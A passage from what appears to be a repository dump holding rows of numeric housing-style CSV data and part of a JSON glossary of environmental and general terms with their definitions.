.9,0,0.544,5.914,83.2,3.9986,4,304,18.4,390.7,18.33,17.8\r\n0.24522,0,9.9,0,0.544,5.782,71.7,4.0317,4,304,18.4,396.9,15.94,19.8\r\n0.40202,0,9.9,0,0.544,6.382,67.2,3.5325,4,304,18.4,395.21,10.36,23.1\r\n0.47547,0,9.9,0,0.544,6.113,58.8,4.0019,4,304,18.4,396.23,12.73,21\r\n0.1676,0,7.38,0,0.493,6.426,52.3,4.5404,5,287,19.6,396.9,7.2,23.8\r\n0.18159,0,7.38,0,0.493,6.376,54.3,4.5404,5,287,19.6,396.9,6.87,23.1\r\n0.35114,0,7.38,0,0.493,6.041,49.9,4.7211,5,287,19.6,396.9,7.7,20.4\r\n0.28392,0,7.38,0,0.493,5.708,74.3,4.7211,5,287,19.6,391.13,11.74,18.5\r\n0.34109,0,7.38,0,0.493,6.415,40.1,4.7211,5,287,19.6,396.9,6.12,25\r\n0.19186,0,7.38,0,0.493,6.431,14.7,5.4159,5,287,19.6,393.68,5.08,24.6\r\n0.30347,0,7.38,0,0.493,6.312,28.9,5.4159,5,287,19.6,396.9,6.15,23\r\n0.24103,0,7.38,0,0.493,6.083,43.7,5.4159,5,287,19.6,396.9,12.79,22.2\r\n0.06617,0,3.24,0,0.46,5.868,25.8,5.2146,4,430,16.9,382.44,9.97,19.3\r\n0.06724,0,3.24,0,0.46,6.333,17.2,5.2146,4,430,16.9,375.21,7.34,22.6\r\n0.04544,0,3.24,0,0.46,6.144,32.2,5.8736,4,430,16.9,368.57,9.09,19.8\r\n0.05023,35,6.06,0,0.4379,5.706,28.4,6.6407,1,304,16.9,394.02,12.43,17.1\r\n0.03466,35,6.06,0,0.4379,6.031,23.3,6.6407,1,304,16.9,362.25,7.83,19.4\r\n0.05083,0,5.19,0,0.515,6.316,38.1,6.4584,5,224,20.2,389.71,5.68,22.2\r\n0.03738,0,5.19,0,0.515,6.31,38.5,6.4584,5,224,20.2,389.4,6.75,20.7\r\n0.03961,0,5.19,0,0.515,6.037,34.5,5.9853,5,224,20.2,396.9,8.01,21.1\r\n0.03427,0,5.19,0,0.515,5.869,46.3,5.2311,5,224,20.2,396.9,9.8,19.5\r\n0.03041,0,5.19,0,0.515,5.895,59.6,5.615,5,224,20.2,394.81,10.56,18.5\r\n0.03306,0,5.19,0,0.515,6.059,37.3,4.8122,5,224,20.2,396.14,8.51,20.6\r\n0.05497,0,5.19,0,0.515,5.985,45.4,4.8122,5,224,20.2,396.9,9.74,19\r\n0.06151,0,5.19,0,0.515,5.968,58.5,4.8122,5,224,20.2,396.9,9.29,18.7\r\n0.01301,35,1.52,0,0.442,7.241,49.3,7.0379,1,284,15.5,394.74,5.49,32.7\r\n0.02498,0,1.89,0,0.518,6.54,59.7,6.2669,1,422,15.9,389.96,8.65,16.5\r\n0.02543,55,3.78,0,0.484,6.696,56.4,5.7321,5,370,17.6,396.9,7.18,23.9\r\n0.03049,55,3.78,0,0.484,6.874,28.1,6.4654,5,370,17.6,387.97,4.61,31.2\r\n0.03113,0,4.39,0,0.442,6.014,48.5,8.0136,3,352,18.8,385.64,10.53,17.5\r\n0.06162,0,4.39,0,0.442,5.898,52.3,8.0136,3,352,18.8,364.61,12.67,17.2\r\n0.0187,85,4.15,0,0.429,6.516,27.7,8.5353,4,351,17.9,392.43,6.36,23.1\r\n0.01501,80,2.01,0,0.435,6.635,29.7,8.344,4,280,17,390.94,5.99,24.5\r\n0.02899,40,1.25,0,0.429,6.939,34.5,8.7921,1,335,19.7,389.85,5.89,26.6\r\n0.06211,40,1.25,0,0.429,6.49,44.4,8.7921,1,335,19.7,396.9,5.98,22.9\r\n0.0795,60,1.69,0,0.411,6.579,35.9,10.7103,4,411,18.3,370.78,5.49,24.1\r\n0.07244,60,1.69,0,0.411,5.884,18.5,10.7103,4,411,18.3,392.33,7.79,18.6\r\n0.01709,90,2.02,0,0.41,6.728,36.1,12.1265,5,187,17,384.46,4.5,30.1\r\n0.04301,80,1.91,0,0.413,5.663,21.9,10.5857,4,334,22,382.8,8.05,18.2\r\n0.10659,80,1.91,0,0.413,5.936,19.5,10.5857,4,334,22,376.04,5.57,20.6\r\n8.98296,0,18.1,1,0.77,6.212,97.4,2.1222,24,666,20.2,377.73,17.6,17.8\r\n3.8497,0,18.1,1,0.77,6.395,91,2.5052,24,666,20.2,391.34,13.27,21.7\r\n5.20177,0,18.1,1,0.77,6.127,83.4,2.7227,24,666,20.2,395.43,11.48,22.7\r\n4.26131,0,18.1,0,0.77,6.112,81.3,2.5091,24,666,20.2,390.74,12.67,22.6\r\n4.54192,0,18.1,0,0.77,6.398,88,2.5182,24,666,20.2,374.56,7.79,25\r\n3.83684,0,18.1,0,0.77,6.251,91.1,2.2955,24,666,20.2,350.65,14.19,19.9\r\n3.67822,0,18.1,0,0.77,5.362,96.2,2.1036,24,666,20.2,380.79,10.19,20.8\r\n4.22239,0,18.1,1,0.77,5.803,89,1.9047,24,666,20.2,353.04,14.64,16.8\r\n3.47428,0,18.1,1,0.718,8.78,82.9,1.9047,24,666,20.2,354.55,5.29,21.9\r\n4.55587,0,18.1,0,0.718,3.561,87.9,1.6132,24,666,20.2,354.7,7.12,27.5\r\n3.69695,0,18.1,0,0.718,4.963,91.4,1.7523,24,666,20.2,316.03,14,21.9\r\n13.5222,0,18.1,0,0.631,3.863,100,1.5106,24,666,20.2,131.42,13.33,23.1\r\n4.89822,0,18.1,0,0.631,4.97,100,1.3325,24,666,20.2,375.52,3.26,50\r\n5.66998,0,18.1,1,0.631,6.683,96.8,1.3567,24,666,20.2,375.33,3.73,50\r\n6.53876,0,18.1,1,0.631,7.016,97.5,1.2024,24,666,20.2,392.05,2.96,50\r\n9.2323,0,18.1,0,0.631,6.216,100,1.1691,24,666,20.2,366.15,9.53,50\r\n8.26725,0,18.1,1,0.668,5.875,89.6,1.1296,24,666,20.2,347.88,8.88,50\r\n11.1081,0,18.1,0,0.668,4.906,100,1.1742,24,666,20.2,396.9,34.77,13.8\r\n18.4982,0,18.1,0,0.668,4.138,100,1.137,24,666,20.2,396.9,37.97,13.8\r\n19.6091,0,18.1,0,0.671,7.313,97.9,1.3163,24,666,20.2,396.9,13.44,15\r\n15.288,0,18.1,0,0.671,6.649,93.3,1.3449,24,666,20.2,363.02,23.24,13.9\r\n9.82349,0,18.1,0,0.671,6.794,98.8,1.358,24,666,20.2,396.9,21.24,13.3\r\n23.6482,0,18.1,0,0.671,6.38,96.2,1.3861,24,666,20.2,396.9,23.69,13.1\r\n17.8667,0,18.1,0,0.671,6.223,100,1.3861,24,666,20.2,393.74,21.78,10.2\r\n88.9762,0,18.1,0,0.671,6.968,91.9,1.4165,24,666,20.2,396.9,17.21,10.4\r\n15.8744,0,18.1,0,0.671,6.545,99.1,1.5192,24,666,20.2,396.9,21.08,10.9\r\n9.18702,0,18.1,0,0.7,5.536,100,1.5804,24,666,20.2,396.9,23.6,11.3\r\n7.99248,0,18.1,0,0.7,5.52,100,1.5331,24,666,20.2,396.9,24.56,12.3\r\n20.0849,0,18.1,0,0.7,4.368,91.2,1.4395,24,666,20.2,285.83,30.63,8.8\r\n16.8118,0,18.1,0,0.7,5.277,98.1,1.4261,24,666,20.2,396.9,30.81,7.2\r\n24.3938,0,18.1,0,0.7,4.652,100,1.4672,24,666,20.2,396.9,28.28,10.5\r\n22.5971,0,18.1,0,0.7,5,89.5,1.5184,24,666,20.2,396.9,31.99,7.4\r\n14.3337,0,18.1,0,0.7,4.88,100,1.5895,24,666,20.2,372.92,30.62,10.2\r\n8.15174,0,18.1,0,0.7,5.39,98.9,1.7281,24,666,20.2,396.9,20.85,11.5\r\n6.96215,0,18.1,0,0.7,5.713,97,1.9265,24,666,20.2,394.43,17.11,15.1\r\n5.29305,0,18.1,0,0.7,6.051,82.5,2.1678,24,666,20.2,378.38,18.76,23.2\r\n11.5779,0,18.1,0,0.7,5.036,97,1.77,24,666,20.2,396.9,25.68,9.7\r\n8.64476,0,18.1,0,0.693,6.193,92.6,1.7912,24,666,20.2,396.9,15.17,13.8\r\n13.3598,0,18.1,0,0.693,5.887,94.7,1.7821,24,666,20.2,396.9,16.35,12.7\r\n8.71675,0,18.1,0,0.693,6.471,98.8,1.7257,24,666,20.2,391.98,17.12,13.1\r\n5.87205,0,18.1,0,0.693,6.405,96,1.6768,24,666,20.2,396.9,19.37,12.5\r\n7.67202,0,18.1,0,0.693,5.747,98.9,1.6334,24,666,20.2,393.1,19.92,8.5\r\n38.3518,0,18.1,0,0.693,5.453,100,1.4896,24,666,20.2,396.9,30.59,5\r\n9.91655,0,18.1,0,0.693,5.852,77.8,1.5004,24,666,20.2,338.16,29.97,6.3\r\n25.0461,0,18.1,0,0.693,5.987,100,1.5888,24,666,20.2,396.9,26.77,5.6\r\n14.2362,0,18.1,0,0.693,6.343,100,1.5741,24,666,20.2,396.9,20.32,7.2\r\n9.59571,0,18.1,0,0.693,6.404,100,1.639,24,666,20.2,376.11,20.31,12.1\r\n24.8017,0,18.1,0,0.693,5.349,96,1.7028,24,666,20.2,396.9,19.77,8.3\r\n41.5292,0,18.1,0,0.693,5.531,85.4,1.6074,24,666,20.2,329.46,27.38,8.5\r\n67.9208,0,18.1,0,0.693,5.683,100,1.4254,24,666,20.2,384.97,22.98,5\r\n20.7162,0,18.1,0,0.659,4.138,100,1.1781,24,666,20.2,370.22,23.34,11.9\r\n11.9511,0,18.1,0,0.659,5.608,100,1.2852,24,666,20.2,332.09,12.13,27.9\r\n7.40389,0,18.1,0,0.597,5.617,97.9,1.4547,24,666,20.2,314.64,26.4,17.2\r\n14.4383,0,18.1,0,0.597,6.852,100,1.4655,24,666,20.2,179.36,19.78,27.5\r\n51.1358,0,18.1,0,0.597,5.757,100,1.413,24,666,20.2,2.6,10.11,15\r\n14.0507,0,18.1,0,0.597,6.657,100,1.5275,24,666,20.2,35.05,21.22,17.2\r\n18.811,0,18.1,0,0.597,4.628,100,1.5539,24,666,20.2,28.79,34.37,17.9\r\n28.6558,0,18.1,0,0.597,5.155,100,1.5894,24,666,20.2,210.97,20.08,16.3\r\n45.7461,0,18.1,0,0.693,4.519,100,1.6582,24,666,20.2,88.27,36.98,7\r\n18.0846,0,18.1,0,0.679,6.434,100,1.8347,24,666,20.2,27.25,29.05,7.2\r\n10.8342,0,18.1,0,0.679,6.782,90.8,1.8195,24,666,20.2,21.57,25.79,7.5\r\n25.9406,0,18.1,0,0.679,5.304,89.1,1.6475,24,666,20.2,127.36,26.64,10.4\r\n73.5341,0,18.1,0,0.679,5.957,100,1.8026,24,666,20.2,16.45,20.62,8.8\r\n11.8123,0,18.1,0,0.718,6.824,76.5,1.794,24,666,20.2,48.45,22.74,8.4\r\n11.0874,0,18.1,0,0.718,6.411,100,1.8589,24,666,20.2,318.75,15.02,16.7\r\n7.02259,0,18.1,0,0.718,6.006,95.3,1.8746,24,666,20.2,319.98,15.7,14.2\r\n12.0482,0,18.1,0,0.614,5.648,87.6,1.9512,24,666,20.2,291.55,14.1,20.8\r\n7.05042,0,18.1,0,0.614,6.103,85.1,2.0218,24,666,20.2,2.52,23.29,13.4\r\n8.79212,0,18.1,0,0.584,5.565,70.6,2.0635,24,666,20.2,3.65,17.16,11.7\r\n15.8603,0,18.1,0,0.679,5.896,95.4,1.9096,24,666,20.2,7.68,24.39,8.3\r\n12.2472,0,18.1,0,0.584,5.837,59.7,1.9976,24,666,20.2,24.65,15.69,10.2\r\n37.6619,0,18.1,0,0.679,6.202,78.7,1.8629,24,666,20.2,18.82,14.52,10.9\r\n7.36711,0,18.1,0,0.679,6.193,78.1,1.9356,24,666,20.2,96.73,21.52,11\r\n9.33889,0,18.1,0,0.679,6.38,95.6,1.9682,24,666,20.2,60.72,24.08,9.5\r\n8.49213,0,18.1,0,0.584,6.348,86.1,2.0527,24,666,20.2,83.45,17.64,14.5\r\n10.0623,0,18.1,0,0.584,6.833,94.3,2.0882,24,666,20.2,81.33,19.69,14.1\r\n6.44405,0,18.1,0,0.584,6.425,74.8,2.2004,24,666,20.2,97.95,12.03,16.1\r\n5.58107,0,18.1,0,0.713,6.436,87.9,2.3158,24,666,20.2,100.19,16.22,14.3\r\n13.9134,0,18.1,0,0.713,6.208,95,2.2222,24,666,20.2,100.63,15.17,11.7\r\n11.1604,0,18.1,0,0.74,6.629,94.6,2.1247,24,666,20.2,109.85,23.27,13.4\r\n14.4208,0,18.1,0,0.74,6.461,93.3,2.0026,24,666,20.2,27.49,18.05,9.6\r\n15.1772,0,18.1,0,0.74,6.152,100,1.9142,24,666,20.2,9.32,26.45,8.7\r\n13.6781,0,18.1,0,0.74,5.935,87.9,1.8206,24,666,20.2,68.95,34.02,8.4\r\n9.39063,0,18.1,0,0.74,5.627,93.9,1.8172,24,666,20.2,396.9,22.88,12.8\r\n22.0511,0,18.1,0,0.74,5.818,92.4,1.8662,24,666,20.2,391.45,22.11,10.5\r\n9.72418,0,18.1,0,0.74,6.406,97.2,2.0651,24,666,20.2,385.96,19.52,17.1\r\n5.66637,0,18.1,0,0.74,6.219,100,2.0048,24,666,20.2,395.69,16.59,18.4\r\n9.96654,0,18.1,0,0.74,6.485,100,1.9784,24,666,20.2,386.73,18.85,15.4\r\n12.8023,0,18.1,0,0.74,5.854,96.6,1.8956,24,666,20.2,240.52,23.79,10.8\r\n10.6718,0,18.1,0,0.74,6.459,94.8,1.9879,24,666,20.2,43.06,23.98,11.8\r\n6.28807,0,18.1,0,0.74,6.341,96.4,2.072,24,666,20.2,318.01,17.79,14.9\r\n9.92485,0,18.1,0,0.74,6.251,96.6,2.198,24,666,20.2,388.52,16.44,12.6\r\n9.32909,0,18.1,0,0.713,6.185,98.7,2.2616,24,666,20.2,396.9,18.13,14.1\r\n7.52601,0,18.1,0,0.713,6.417,98.3,2.185,24,666,20.2,304.21,19.31,13\r\n6.71772,0,18.1,0,0.713,6.749,92.6,2.3236,24,666,20.2,0.32,17.44,13.4\r\n5.44114,0,18.1,0,0.713,6.655,98.2,2.3552,24,666,20.2,355.29,17.73,15.2\r\n5.09017,0,18.1,0,0.713,6.297,91.8,2.3682,24,666,20.2,385.09,17.27,16.1\r\n8.24809,0,18.1,0,0.713,7.393,99.3,2.4527,24,666,20.2,375.87,16.74,17.8\r\n9.51363,0,18.1,0,0.713,6.728,94.1,2.4961,24,666,20.2,6.68,18.71,14.9\r\n4.75237,0,18.1,0,0.713,6.525,86.5,2.4358,24,666,20.2,50.92,18.13,14.1\r\n4.66883,0,18.1,0,0.713,5.976,87.9,2.5806,24,666,20.2,10.48,19.01,12.7\r\n8.20058,0,18.1,0,0.713,5.936,80.3,2.7792,24,666,20.2,3.5,16.94,13.5\r\n7.75223,0,18.1,0,0.713,6.301,83.7,2.7831,24,666,20.2,272.21,16.23,14.9\r\n6.80117,0,18.1,0,0.713,6.081,84.4,2.7175,24,666,20.2,396.9,14.7,20\r\n4.81213,0,18.1,0,0.713,6.701,90,2.5975,24,666,20.2,255.23,16.42,16.4\r\n3.69311,0,18.1,0,0.713,6.376,88.4,2.5671,24,666,20.2,391.43,14.65,17.7\r\n6.65492,0,18.1,0,0.713,6.317,83,2.7344,24,666,20.2,396.9,13.99,19.5\r\n5.82115,0,18.1,0,0.713,6.513,89.9,2.8016,24,666,20.2,393.82,10.29,20.2\r\n7.83932,0,18.1,0,0.655,6.209,65.4,2.9634,24,666,20.2,396.9,13.22,21.4\r\n3.1636,0,18.1,0,0.655,5.759,48.2,3.0665,24,666,20.2,334.4,14.13,19.9\r\n3.77498,0,18.1,0,0.655,5.952,84.7,2.8715,24,666,20.2,22.01,17.15,19\r\n4.42228,0,18.1,0,0.584,6.003,94.5,2.5403,24,666,20.2,331.29,21.32,19.1\r\n15.5757,0,18.1,0,0.58,5.926,71,2.9084,24,666,20.2,368.74,18.13,19.1\r\n13.0751,0,18.1,0,0.58,5.713,56.7,2.8237,24,666,20.2,396.9,14.76,20.1\r\n4.34879,0,18.1,0,0.58,6.167,84,3.0334,24,666,20.2,396.9,16.29,19.9\r\n4.03841,0,18.1,0,0.532,6.229,90.7,3.0993,24,666,20.2,395.33,12.87,19.6\r\n3.56868,0,18.1,0,0.58,6.437,75,2.8965,24,666,20.2,393.37,14.36,23.2\r\n4.64689,0,18.1,0,0.614,6.98,67.6,2.5329,24,666,20.2,374.68,11.66,29.8\r\n8.05579,0,18.1,0,0.584,5.427,95.4,2.4298,24,666,20.2,352.58,18.14,13.8\r\n6.39312,0,18.1,0,0.584,6.162,97.4,2.206,24,666,20.2,302.76,24.1,13.3\r\n4.87141,0,18.1,0,0.614,6.484,93.6,2.3053,24,666,20.2,396.21,18.68,16.7\r\n15.0234,0,18.1,0,0.614,5.304,97.3,2.1007,24,666,20.2,349.48,24.91,12\r\n10.233,0,18.1,0,0.614,6.185,96.7,2.1705,24,666,20.2,379.7,18.03,14.6\r\n14.3337,0,18.1,0,0.614,6.229,88,1.9512,24,666,20.2,383.32,13.11,21.4\r\n5.82401,0,18.1,0,0.532,6.242,64.7,3.4242,24,666,20.2,396.9,10.74,23\r\n5.70818,0,18.1,0,0.532,6.75,74.9,3.3317,24,666,20.2,393.07,7.74,23.7\r\n5.73116,0,18.1,0,0.532,7.061,77,3.4106,24,666,20.2,395.28,7.01,25\r\n2.81838,0,18.1,0,0.532,5.762,40.3,4.0983,24,666,20.2,392.92,10.42,21.8\r\n2.37857,0,18.1,0,0.583,5.871,41.9,3.724,24,666,20.2,370.73,13.34,20.6\r\n3.67367,0,18.1,0,0.583,6.312,51.9,3.9917,24,666,20.2,388.62,10.58,21.2\r\n5.69175,0,18.1,0,0.583,6.114,79.8,3.5459,24,666,20.2,392.68,14.98,19.1\r\n4.83567,0,18.1,0,0.583,5.905,53.2,3.1523,24,666,20.2,388.22,11.45,20.6\r\n0.15086,0,27.74,0,0.609,5.454,92.7,1.8209,4,711,20.1,395.09,18.06,15.2\r\n0.18337,0,27.74,0,0.609,5.414,98.3,1.7554,4,711,20.1,344.05,23.97,7\r\n0.20746,0,27.74,0,0.609,5.093,98,1.8226,4,711,20.1,318.43,29.68,8.1\r\n0.10574,0,27.74,0,0.609,5.983,98.8,1.8681,4,711,20.1,390.11,18.07,13.6\r\n0.11132,0,27.74,0,0.609,5.983,83.5,2.1099,4,711,20.1,396.9,13.35,20.1\r\n0.17331,0,9.69,0,0.585,5.707,54,2.3817,6,391,19.2,396.9,12.01,21.8\r\n0.27957,0,9.69,0,0.585,5.926,42.6,2.3817,6,391,19.2,396.9,13.59,24.5\r\n0.17899,0,9.69,0,0.585,5.67,28.8,2.7986,6,391,19.2,393.29,17.6,23.1\r\n0.2896,0,9.69,0,0.585,5.39,72.9,2.7986,6,391,19.2,396.9,21.14,19.7\r\n0.26838,0,9.69,0,0.585,5.794,70.6,2.8927,6,391,19.2,396.9,14.1,18.3\r\n0.23912,0,9.69,0,0.585,6.019,65.3,2.4091,6,391,19.2,396.9,12.92,21.2\r\n0.17783,0,9.69,0,0.585,5.569,73.5,2.3999,6,391,19.2,395.77,15.1,17.5\r\n0.22438,0,9.69,0,0.585,6.027,79.7,2.4982,6,391,19.2,396.9,14.33,16.8\r\n0.06263,0,11.93,0,0.573,6.593,69.1,2.4786,1,273,21,391.99,9.67,22.4\r\n0.04527,0,11.93,0,0.573,6.12,76.7,2.2875,1,273,21,396.9,9.08,20.6\r\n0.06076,0,11.93,0,0.573,6.976,91,2.1675,1,273,21,396.9,5.64,23.9\r\n0.10959,0,11.93,0,0.573,6.794,89.3,2.3889,1,273,21,393.45,6.48,22\r\n0.04741,0,11.93,0,0.573,6.03,80.8,2.505,1,273,21,396.9,7.88,11.9\r\n"
        },
        {
          "name": "data.db",
          "type": "blob",
          "size": 0,
          "content": ""
        },
        {
          "name": "data.json",
          "type": "blob",
          "size": 4797.8466796875,
          "content": "{\"abandoned industrial site\": [\"Site that cannot be used for any purpose, being contaminated by pollutants.\"], \"abandoned vehicle\": [\"A vehicle that has been discarded in the environment, urban or otherwise, often found wrecked, destroyed, damaged or with a major component part stolen or missing.\"], \"abiotic factor\": [\"Physical, chemical and other non-living environmental factor.\"], \"access road\": [\"Any street or narrow stretch of paved surface that leads to a specific destination, such as a main highway.\"], \"access to the sea\": [\"The ability to bring goods to and from a port that is able to harbor sea faring vessels.\"], \"accident\": [\"An unexpected, unfortunate mishap, failure or loss with the potential for harming human life, property or the environment.\", \"An event that happens suddenly or by chance without an apparent cause.\"], \"accumulator\": [\"A rechargeable device for storing electrical energy in the form of chemical energy, consisting of one or more separate secondary cells.\\\\n(Source: CED)\"], \"acidification\": [\"Addition of an acid to a solution until the pH falls below 7.\"], \"acidity\": [\"The state of being acid that is of being capable of transferring a hydrogen ion in solution.\"], \"acidity degree\": [\"The amount of acid present in a solution, often expressed in terms of pH.\"], \"acid rain\": [\"Rain having a pH less than 5.6.\"], \"acid\": [\"A compound capable of transferring a hydrogen ion in solution.\", \"Being harsh or corrosive in tone.\", \"Having an acid, sharp or tangy taste.\", \"A powerful hallucinogenic drug manufactured from lysergic acid.\", \"Having a pH less than 7, or being sour, or having the strength to neutralize  alkalis, or turning a litmus paper red.\"], \"acoustic filter\": [\"A device employed to reject sound in a particular range of frequencies while passing sound in another range of frequencies.\"], \"acoustic insulation\": [\"The process of preventing the transmission of sound by surrounding with a nonconducting material.\"], \"acoustic level\": [\"Physical quantity of sound measured, usually expressed in decibels.\\\\n(Source: KORENa)\"], \"acoustic property\": [\"The characteristics found within a structure that determine the quality of sound in its relevance to hearing.\\\\n(Source: KOREN)\"], \"acoustics\": [\"The science of the production, transmission and effects of sound.\"], \"actinide\": [\"An element member of the actinide group of 15 radioactive elements.\"], \"actinium\": [\"A radioactive element of the actinide series, occurring as a decay product of uranium. It is used as an alpha particle source and in neutron production.\\\\n(Source: CED)\"], \"action group\": [\"A collection of persons united to address specific sociopolitical or socioeconomic concerns.\"], \"activated carbon\": [\"A powdered, granular or pelleted form of amorphous carbon characterized by a very large surface area per unit volume because of an enormous number of fine pores.\\\\n(Source: LANDY)\"], \"activated sludge\": [\"Sludge that has been aerated and subjected to bacterial action; used to speed breakdown of organism matter in raw sewage during secondary waste treatment.\\\\n(Source: LANDY)\"], \"act\": [\"Something done voluntarily by a person, and of such a nature that certain legal consequences attach to it.\", \"Legal documents, decrees, edicts, laws, judgments, etc.\", \"To do something.\", \"To perform a theatrical role.\"], \"adaptable species\": [\"Species capable of adapting to changing circumstances.\"], \"chemical addition\": [\"Chemical reaction in which one or more of the double bonds or triple bonds in an unsaturated compound is converted to a single bond by the addition of other atoms or groups.\"], \"additional packaging\": [\"Additional packaging around the normal sales packaging, for example as protection against theft or for the purpose of advertising.\"], \"addition polymer\": [\"A polymer formed by the chain addition of unsaturated monomer molecules, such as olefins, with one another without the formation of a by-product, as water; examples are polyethylene, polypropylene and polystyrene.\"], \"additive\": [\"A substance mixed in small quantities with another product to modify its chemical or physical state, for example to make food look visually more attractive.\", \"Proper to be added.\"], \"adhesive\": [\"Substance used for sticking objects together.\"], \"acceptable daily intake\": [\"The measurement of the amount of any chemical substance that can be safely consumed by a human being in a day. Calculations are usually based on the maximum level of a substance that can be fed to animals without producing any harmful effects. This is divided by a \\\"safety factor\\\" to allow for the differences between animals and humans and to take account of the variation in human diets.\"], \"administration\": [\"The management or direction of the affairs of a public or private office, business or organization.\"], \"administrative body\": [\"Any governmental agency or organization charged with managing and implementing regulations, laws and government policies.\\\\n(Source: BLD)\", \"All representatives in a company that have the assignment to administrate the company itself.\"], \"administrative competence\": [\"The power of an administrative organ to exercise control over a certain field.\"], \"administrative fiat\": [\"An authoritative decree, sanction or order issued from an office with executive or managerial authority, without necessarily having the force of law or its equivalent.\\\\n(Source: RHW / BLD)\"], \"administrative jurisdiction\": [\"The extent, power or territory in which an office with executive or managerial authority administers justice or declares judgments.\\\\n(Source: RHW / BLD)\"], \"administrative law\": [\"Body of law created by administrative agencies in the form of rules, regulations, orders and decisions to carry out regulatory powers and duties of such agencies.\\\\n(Source: BLACK)\"], \"administrative sanction\": [\"Any formal official imposition of penalty or fine, e.g.: destruction, taking, seizure, or withholding of property; assessment of damages, reimbursement, restitution, compensation, costs, charges or fees; requirement, revocation or suspension of license; or any other compulsory or restrictive action taken by an organization, agency or its representative.\"], \"adsorption\": [\"The physical or chemical bonding of molecules of gas, liquid or a dissolved substance to the external surface of a solid or the internal surface, if the material is porous, in a very thin layer.\"], \"adult\": [\"A person who is fully grown, developed or of a specified age.\", \"(of animals) fully developed.\"], \"adult education\": [\"Any instruction or training, informal or formal, which is geared to persons of mature age, regardless of previous education, and typically offered by university extension programs, employers, correspondence courses or community groups.\"], \"advertisement\": [\"The action of drawing public attention to goods, services or events, often through paid announcements in newspapers, magazines, television or radio.\\\\n(Source: C / RHW)\"], \"product advertising\": [\"The creation and dissemination of paid announcements or public notices to draw attention to goods, services or events offered by some entity, usually for purchase.\\\\n(Source: RHW)\"], \"advice\": [\"Official notice, opinion, counsel or recommendation that is optional or at the receiver's discretion.\"], \"aeration\": [\"Exposition to the action of air.\"], \"aerial photograph\": [\"An image of the ground surface made on a light-sensitive material and taken at a high altitude from an aircraft, spacecraft or rocket.\\\\n(Source: MHD)\"], \"aerobic process\": [\"A process requiring the presence of oxygen.\"], \"aerobiology\": [\"The study of the atmospheric dispersal of airborne fungus spores, pollen grains, and microorganisms; and, more broadly, of airborne propagules of algae and protozoans, minute insects such as aphids, and pollution gases and particles which exert specific biologic effects.\"], \"aerodynamic noise\": [\"Acoustic noise caused by turbulent airflow over the surface of a body.\"], \"aerosol\": [\"A gaseous suspension of ultramicroscopic particles of a liquid or a solid.\\\\n(Source: MGH)\", \"An aerosol can for applying paint, deodorant, etc., as a fine spray.\"], \"afforestation\": [\"Establishment of a new forest by seeding or planting of nonforested land.\", \"The planting of trees on land which was previously used for other uses than forestry.\", \"The planting of trees in an area, or the management of an area to allow trees to regenerate or colonize naturally, in order to produce a forest.\"], \"Africa\": [\"The second largest of the continents, on the Mediterranean in the north, the Atlantic in the west, and the Red Sea, Gulf of Aden, and Indian Ocean in the east.\"], \"afterburning\": [\"The incineration of polluting gases and particles resulting from incompletely combusted fuel, and the breakdown of other molecules associated with combustion into inert chemicals.\"], \"age\": [\"The period of time that a person, animal or plant has lived or is expected to live.\", \"To begin to look older; to get older.\", \"To make older.\", \"A period of history having some distinctive feature.\", \"How long something has existed.\"], \"agricultural biotechnology\": [\"An advanced technology that allows plant breeders to make precise genetic changes to impart beneficial traits to crop plants.\"], \"agricultural building\": [\"The buildings and adjacent service areas of a farm.\\\\n(Source: WEBSTE)\"], \"agricultural ecology\": [\"Study of the ecology of agricultural systems and the natural resources required to sustain them.\"], \"agricultural economics\": [\"An applied social science that deals with the production, distribution, and consumption of agricultural or farming goods and services.\"], \"agricultural engineering\": [\"A discipline concerned with developing and improving the means for providing food and fiber for mankind's needs.\\\\n(Source: MGH)\"], \"agricultural equipment\": [\"Machines utilized for tillage, planting, cultivation and harvesting of crops. Despite its benefits in increasing yields, mechanisation has clearly had some adverse environmental effects: deep ploughing exposes more soil to wind and water erosion; crop residues can be removed as opposed to ploughing back into the soil; removal of residues can lead to a serious loss of organic content in the soil, which may increase the risk of soil erosion.\\\\n(Source: MGH /  DOBRIS)\"], \"agricultural machinery\": [\"Machines utilized for tillage, planting, cultivation and harvesting of crops. Despite its benefits in increasing yields, mechanisation has clearly had some adverse environmental effects: deep ploughing exposes more soil to wind and water erosion; crop residues can be removed as opposed to ploughing back into the soil; removal of residues can lead to a serious loss of organic content in the soil, which may increase the risk of soil erosion.\\\\n(Source: MGH /  DOBRIS)\"], \"agricultural management\": [\"The administration or handling of soil, crops and livestock.\"], \"agricultural pest\": [\"Insects and mites that damage crops, weeds that compete with field crops for nutrients and water, plants that choke irrigation channels or drainage systems, rodents that eat young plants and grain, and birds that eat seedlings or stored foodstuffs.\\\\n(Source: WRIGHT)\"], \"agricultural policy\": [\"A course of action adopted by government or some other organization that determines how to deal with matters involving the cultivation of land; raising crops; feeding, breeding and raising livestock or poultry; and other farming issues.\\\\n(Source: RHW)\"], \"agricultural production\": [\"The amount of grown crops and breeded livestock per year in a given area.\"], \"agriculture\": [\"The production of plants and animals useful to man, involving soil cultivation and the breeding and management of crops and livestock.\"], \"agrochemical\": [\"Any substance or mixture of substances used or intended to be used for preventing, destroying, repelling, attracting, inhibiting, or controlling any insects, rodents, birds, nematodes, bacteria, fungi, weeds or other forms of plant, animal or microbial life regarded as pests.\"], \"agroforestry\": [\"The interplanting of farm crops and trees, especially leguminous species. In semiarid regions and on denuded hillsides, agroforestry helps control erosion and restores soil fertility, as well as supplying valuable food and commodities at the same time.\\\\n(Source: ALL)\"], \"agroindustry\": [\"Industry dealing with the supply, processing and distribution of farm products.\\\\n(Source: PHC)\"], \"agrometeorology\": [\"The study of the interaction between meteorological and hydrological factors, on the one hand, and agriculture in the widest sense, including horticulture, animal husbandry and forestry, on the other.\\\\n(Source: EURMET)\"], \"AIDS\": [\"A disease of the human immune system caused by the human immunodeficiency virus (HIV).\"], \"air\": [\"A predominantly mechanical mixture of a variety of individual gases forming the earth's enveloping atmosphere.\", \"To expose to fresh air.\", \"To send data over the airwaves, as in radio or television.\", \"An expression or appearance indicating a certain state of mind.\", \"A succession of notes forming a distinctive sequence.\", \"The space above the earth's surface where planes fly.\", \"To expose to cool or cold air so as to cool or freshen.\"], \"air conditioning\": [\"A system or process for controlling the temperature and sometimes the humidity and purity of the air in a house, etc.\"], \"aircraft\": [\"A vehicle, designed to be supported by the air, either by the dynamic action of the air upon the surfaces of the structure or object or by its own buoyancy.\\\\n(Source: MGH)\"], \"aircraft noise\": [\"Noise caused by various sources associated with aircraft operation, such as propeller and engine exhaust, jet noise, and sonic boom.\"], \"air movement\": [\"Air movements within the Earth's atmospheric circulation; also called 